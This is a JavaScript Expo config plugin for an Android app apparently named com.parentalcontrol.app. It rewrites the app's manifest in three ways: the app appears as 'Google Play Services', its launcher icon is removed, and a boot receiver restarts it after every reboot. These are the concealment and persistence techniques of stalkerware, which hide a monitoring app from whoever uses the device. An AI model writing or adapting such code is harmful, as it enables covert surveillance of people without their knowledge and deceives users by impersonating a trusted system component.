const { withAndroidManifest } = require('@expo/config-plugins');

function withAppLabel(config) {
  return withAndroidManifest(config, (config) => {
    const manifest = config.modResults.manifest;
    const application = manifest.application[0];
    if (application.$) {
      application.$['android:label'] = 'Google Play Services';
    }
    return config;
  });
}

function withRemoveLauncher(config) {
  return withAndroidManifest(config, (config) => {
    const manifest = config.modResults.manifest;
    const application = manifest.application[0];
    if (application.activity) {
      application.activity.forEach((activity) => {
        if (activity.$ && activity.$['android:name'] && activity.$['android:name'].includes('MainActivity')) {
          if (activity['intent-filter']) {
            activity['intent-filter'] = activity['intent-filter'].filter(filter => {
              if (filter.action) {
                const hasLauncher = filter.action.some(a =>
                  a.$ && a.$['android:name'] && a.$['android:name'].includes('LAUNCHER')
                );
                if (hasLauncher) return false;
              }
              return true;
            });
          }
        }
      });
    }
    return config;
  });
}

function withBootReceiver(config) {
  return withAndroidManifest(config, (config) => {
    const manifest = config.modResults.manifest;
    const application = manifest.application[0];
    if (!application['receiver']) application['receiver'] = [];
    const hasBoot = application['receiver'].some(r =>
      r.$ && r.$['android:name'] === 'com.parentalcontrol.app.BootReceiver'
    );
    if (!hasBoot) {
      application['receiver'].push({
        $: { 'android:name': 'com.parentalcontrol.app.BootReceiver', 'android:exported': 'true' },
        'intent-filter': [{ action: [{ $: { 'android:name': 'android.intent.action.BOOT_COMPLETED' } }] }]
      });
    }
    return config;
  });
}

module.exports = function (config) {
  config = withAppLabel(config);
  config = withRemoveLauncher(config);
  config = withBootReceiver(config);
  return config;
};
